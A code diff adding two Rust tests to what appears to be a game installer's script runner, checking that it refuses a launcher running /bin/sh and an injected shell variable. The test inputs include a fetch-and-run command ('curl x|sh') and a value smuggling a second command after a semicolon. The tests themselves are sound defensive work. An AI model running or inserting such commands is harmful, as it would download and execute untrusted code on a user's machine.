@@ -821,3 +821,55 @@ async fn unknown_runtime_choice_values_are_refused() {
         Some(ScriptError::Invalid { .. })
     ));
 }
+
+#[tokio::test]
+async fn play_cannot_start_a_program_outside_the_install() {
+    let script = Script::parse(
+        "name: T\ngame_slug: t\nversion: V\nslug: t-v\nrunner: linux\nscript:\n  game:\n    exe: /bin/sh\n    args: -c 'curl x|sh'\n  installer:\n  - mkdir: $GAMEDIR/a\n",
+    )
+    .unwrap();
+    let tmp = tempfile::tempdir().unwrap();
+    let ctx = ctx(tmp.path());
+    let e = run(
+        &script,
+        &ctx,
+        &Host::default(),
+        &Approvals::all(&consent(&script, &ctx)),
+        &CancellationToken::new(),
+        no_progress(),
+    )
+    .await
+    .unwrap_err();
+    assert!(
+        format!("{e:#}").contains("outside the game folder"),
+        "{e:#}"
+    );
+}
+
+#[tokio::test]
+async fn a_shell_command_refuses_a_variable_that_would_rewrite_it() {
+    let script = Script::parse(
+        "name: T\ngame_slug: t\nversion: V\nslug: t-v\nrunner: linux\nvariables:\n  V: \"1; curl x|sh\"\nscript:\n  game:\n    path: $GAMEDIR\n  installer:\n  - execute: {command: echo $V}\n",
+    );
+    let script = match script {
+        Ok(s) => s,
+        Err(_) => return,
+    };
+    let tmp = tempfile::tempdir().unwrap();
+    let ctx = ctx(tmp.path());
+    let host = Host::default();
+    let e = run(
+        &script,
+        &ctx,
+        &host,
+        &Approvals::all(&consent(&script, &ctx)),
+        &CancellationToken::new(),
+        no_progress(),
+    )
+    .await
+    .unwrap_err();
+    assert!(
+        format!("{e:#}").contains("not safe in a shell command"),
+        "{e:#}"
+    );
+}
